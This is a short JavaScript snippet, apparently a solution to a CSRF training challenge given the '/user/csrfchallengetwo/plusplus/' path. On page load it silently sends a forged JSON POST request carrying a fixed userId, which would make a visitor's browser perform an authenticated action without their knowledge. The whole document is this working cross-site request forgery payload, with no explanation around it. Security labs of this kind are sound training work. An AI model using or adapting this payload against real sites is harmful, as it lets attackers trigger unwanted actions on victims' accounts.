window.onload = function(){

var xhr = new XMLHttpRequest();
xhr.open("POST", "/user/csrfchallengetwo/plusplus/", true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
    userId: 581451794
}));
};

